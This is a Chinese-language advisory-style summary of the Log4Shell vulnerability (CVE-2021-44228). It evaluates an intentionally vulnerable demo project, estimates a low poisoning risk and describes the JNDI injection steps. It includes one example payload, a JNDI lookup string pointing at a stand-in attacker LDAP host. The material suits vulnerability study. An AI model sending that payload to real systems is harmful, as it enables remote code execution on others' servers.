## CVE-2021-44228 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行，系统完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且允许记录用户可控的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个远程代码执行漏洞。攻击者可以通过发送包含特定格式字符串（例如 `${jndi:ldap://attacker.com/a}`）的请求，如果该字符串被 Log4j2 记录，则 Log4j2 会尝试通过 JNDI（Java Naming and Directory Interface）去指定的LDAP服务器上查找并执行相应的代码。该演示项目使用了存在漏洞的 Log4j 2.14.1 版本，并提供了多种攻击方法，包括User-Agent头注入和查询参数注入。

**有效性：** 提供的POC代码有效，可以复现CVE-2021-44228漏洞。

**投毒风险：** 该项目主要用于演示漏洞，在`LICENSE`文件中明确声明“This project is intended for educational and security research purposes only. It contains intentionally vulnerable code (Log4j 2.14.1) to demonstrate the CVE-2021-44228 (Log4Shell) vulnerability. DO NOT use this code in production environments.”。因此，可以判断作者主观上没有投毒意图。但是仍然存在一定风险，因为用户在使用该项目时，可能会不小心将其部署到生产环境中，造成安全风险。因此投毒风险评估为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者向目标应用程序发送包含恶意JNDI查找表达式的请求。例如，通过User-Agent头或者查询参数。
2.  **JNDI注入：** 当Log4j2记录包含该表达式的日志时，它会尝试解析该表达式。
3.  **远程代码执行：** Log4j2会通过JNDI向攻击者控制的LDAP服务器请求Java对象。攻击者的LDAP服务器返回一个包含恶意代码的Java对象。
4.  **代码执行：** Log4j2加载并执行该Java对象中的恶意代码，从而导致远程代码执行。

**项目地址:** [Mintimate/log4j2-bugmaker](https://github.com/Mintimate/log4j2-bugmaker)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)